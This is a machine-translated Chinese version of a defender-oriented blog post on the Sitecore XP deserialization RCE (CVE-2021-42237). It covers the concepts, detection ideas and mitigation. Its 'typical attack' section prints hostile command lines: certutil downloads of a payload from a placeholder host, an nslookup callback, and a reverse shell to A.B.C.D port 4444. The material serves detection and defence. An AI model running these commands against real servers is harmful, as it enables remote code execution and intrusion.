<html>
<head>
<title>A Defender’s Perspective of Sitecore XP Deserialization RCE (CVE-2021–42237)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">从一个捍卫者的角度看 Sitecore XP 反序列化 RCE(CVE-2021–42237)</h1>
<blockquote>原文：<a href="https://medium.com/nerd-for-tech/a-defenders-perspective-of-sitecore-xp-deserialization-rce-cve-2021-42237-dcd5355ca591?source=collection_archive---------1-----------------------#2022-04-08">https://medium.com/nerd-for-tech/a-defenders-perspective-of-sitecore-xp-deserialization-rce-cve-2021-42237-dcd5355ca591?source=collection_archive---------1-----------------------#2022-04-08</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/464e5beeb1ed34b439210d89f94c37c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6MoVyuUN5SAz3RhVgh3Jyw.jpeg"/></div></div><figcaption class="iq ir et er es is it bd b be z dx translated">路易斯·康的照片在<a class="ae iu" href="https://unsplash.com/s/photos/code-execution?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText" rel="noopener ugc nofollow" target="_blank"> Unsplash </a></figcaption></figure><p id="647f" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">Sitecore 的体验平台(XP)是一个. NET 企业内容管理系统(CMS)。Sitecore XP 为您提供了用于内容管理、数字营销以及分析和报告的工具。</p><h2 id="a0ca" class="jt ju hi bd jv jw jx jy jz ka kb kc kd jg ke kf kg jk kh ki kj jo kk kl km kn bi translated">CVE-2021–42237</h2><p id="9697" class="pw-post-body-paragraph iv iw hi ix b iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo ks jq jr js hb bi translated">Sitecore XP 7.5 到 Sitecore XP 8.2 Update-7 的初始版本容易受到不安全的反序列化攻击，攻击者可能在机器上远程执行命令。利用此漏洞不需要身份验证或特殊配置。</p><h1 id="bdd5" class="kt ju hi bd jv ku kv kw jz kx ky kz kd la lb lc kg ld le lf kj lg lh li km lj bi translated">入门前的关键概念</h1><h2 id="4a18" class="jt ju hi bd jv jw jx jy jz ka kb kc kd jg ke kf kg jk kh ki kj jo kk kl km kn bi translated">不安全的反序列化</h2><p id="cd4f" class="pw-post-body-paragraph iv iw hi ix b iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo ks jq jr js hb bi translated">序列化是将对象转换为静态字节流，可以保存到数据库或通过网络传输。反序列化是该过程的逆过程，从字节流重建数据结构或对象。</p><p id="102a" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">当不受信任的数据被用来滥用应用程序的逻辑，造成拒绝服务(DoS)攻击，甚至在反序列化后执行任意代码时，就会出现此漏洞。<br/>当用户可控制的数据被网站反序列化时，这可能会使攻击者操纵序列化对象，将有害数据传递到应用程序代码中。</p><h2 id="86c0" class="jt ju hi bd jv jw jx jy jz ka kb kc kd jg ke kf kg jk kh ki kj jo kk kl km kn bi translated">Web 外壳</h2><p id="c560" class="pw-post-body-paragraph iv iw hi ix b iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo ks jq jr js hb bi translated">web 外壳通常是用典型的 web 开发编程语言(例如，ASP、PHP、JSP)编写的一小段恶意代码，攻击者将其植入 web 服务器以提供对服务器功能的远程访问和代码执行。</p><p id="36ed" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">运行可疑进程(如“cmd.exe /c echo”、“certutil.exe”或“powershell.exe”)的 IIS 实例(w3wp.exe)会导致在可通过 web 访问的文件夹中创建脚本文件，这种情况很少见，通常是 web shell 活动的明显迹象。</p><h2 id="12c9" class="jt ju hi bd jv jw jx jy jz ka kb kc kd jg ke kf kg jk kh ki kj jo kk kl km kn bi translated">打嗝合作者</h2><p id="c411" class="pw-post-body-paragraph iv iw hi ix b iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo ks jq jr js hb bi translated">Burp Suite 用来帮助发现多种漏洞的网络服务。<br/>Collaborator 客户端可用于生成手动测试中使用的有效负载，并轮询 Collaborator 服务器使用这些有效负载产生的任何网络交互。</p><h2 id="b9ab" class="jt ju hi bd jv jw jx jy jz ka kb kc kd jg ke kf kg jk kh ki kj jo kk kl km kn bi translated">CertUtil</h2><p id="7c70" class="pw-post-body-paragraph iv iw hi ix b iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo ks jq jr js hb bi translated">用于处理证书的 Windows 二进制文件。</p><p id="8a91" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">certutil 的预期用途是转储和显示证书颁发机构(CA)配置信息、配置证书服务、备份和还原 CA 组件以及验证证书、密钥对或证书链。但是，攻击者可以使用该工具通过 URL 模式(ftp://、http://等)从互联网获取数据。</p><h1 id="2407" class="kt ju hi bd jv ku kv kw jz kx ky kz kd la lb lc kg ld le lf kj lg lh li km lj bi translated">典型的攻击会是什么样子？</h1><ol class=""><li id="503c" class="lk ll hi ix b iy ko jc kp jg lm jk ln jo lo js lp lq lr ls bi translated">Sitecore XP 在 Report.ashx 文件中使用不安全的反序列化，攻击者可以利用该文件在系统上执行任意代码</li><li id="85ec" class="lk ll hi ix b iy lt jc lu jg lv jk lw jo lx js lp lq lr ls bi translated">对易受攻击的服务器的扫描尝试</li></ol><pre class="ly lz ma mb fd mc md me mf aw mg bi"><span id="3524" class="jt ju hi md b fi mh mi l mj mk">URI: “/sitecore/shell/ClientBin/Reporting/Report.ashx”</span></pre><p id="1ac5" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">3.nslookup 从端点到 burpcollaborator 域</p><pre class="ly lz ma mb fd mc md me mf aw mg bi"><span id="b44a" class="jt ju hi md b fi mh mi l mj mk">nslookup 5ouceXYZQtem.burpcollaborator.net</span></pre><p id="78f3" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">4.有效载荷下载</p><pre class="ly lz ma mb fd mc md me mf aw mg bi"><span id="6e18" class="jt ju hi md b fi mh mi l mj mk">“C:\Windows\System32\cmd.exe” /c certutil -urlcache -f https://5ouceXYZQtem.burpcollaborator.net</span><span id="ad9c" class="jt ju hi md b fi ml mi l mj mk">certutil -f -urlcache http://A.B.C.D:8000/file.exe C:\Windows\Temp\file.exe</span></pre><p id="556d" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">5.反向外壳</p><pre class="ly lz ma mb fd mc md me mf aw mg bi"><span id="fee9" class="jt ju hi md b fi mh mi l mj mk">C:\Windows\Temp\file.exe A.B.C.D 4444 -e cmd</span></pre><p id="1efb" class="pw-post-body-paragraph iv iw hi ix b iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr js hb bi translated">通过成功利用此漏洞，攻击者可以以运行 IIS 实例的用户身份执行任意代码。然后，攻击者可以使用“getsystem”命令来使用 RPCSS 模拟并获得系统级代码执行。</p><h1 id="25c7" class="kt ju hi bd jv ku kv kw jz kx ky kz kd la lb lc kg ld le lf kj lg lh li km lj bi translated">侦查思路</h1><ol class=""><li id="6fbc" class="lk ll hi ix b iy ko jc kp jg lm jk ln jo lo js lp lq lr ls bi translated">certutil <br/>的可疑用法确定 certutil.exe 正在进行网络连接。对手可以滥用 certutil.exe 从远程网址下载证书或恶意软件。<a class="ae iu" href="https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_certutil_command.yml" rel="noopener ugc nofollow" target="_blank">链接</a>为适马统治。</li><li id="8053" class="lk ll hi ix b iy lt jc lu jg lv jk lw jo lx js lp lq lr ls bi translated">可疑 nslookup 流量<br/>nslookup.exe 执行和查询*.burpcollaborator.net 域</li></ol><h1 id="c546" class="kt ju hi bd jv ku kv kw jz kx ky kz kd la lb lc kg ld le lf kj lg lh li km lj bi translated">减轻</h1><p id="417e" class="pw-post-body-paragraph iv iw hi ix b iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo ks jq jr js hb bi translated">建议的解决方案是升级到安全版本，最好是 Sitecore XP 9.0 或更高版本。或者，可以通过在所有服务器实例上删除“/sitecore/shell/client bin/Reporting/Report.ashx”中的 report . ashx 文件来缓解该漏洞。</p><h1 id="6f51" class="kt ju hi bd jv ku kv kw jz kx ky kz kd la lb lc kg ld le lf kj lg lh li km lj bi translated">参考</h1><p id="9c6c" class="pw-post-body-paragraph iv iw hi ix b iy ko ja jb jc kp je jf jg kq ji jj jk kr jm jn jo ks jq jr js hb bi translated">【https://blog.assetnote.io/2021/11/02/sitecore-rce/<br/><a class="ae iu" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-42237" rel="noopener ugc nofollow" target="_blank">https://cve.mitre.org/cgi-bin/cvename.cgi?</a><a class="ae iu" href="https://blog.assetnote.io/2021/11/02/sitecore-rce/" rel="noopener ugc nofollow" target="_blank">name = https://lolbas-project.github.io/lolbas/Binaries/Certutil/ CVE-2021-42237</a><br/><a class="ae iu" href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/" rel="noopener ugc nofollow" target="_blank"/></p></div></div>    
</body>
</html>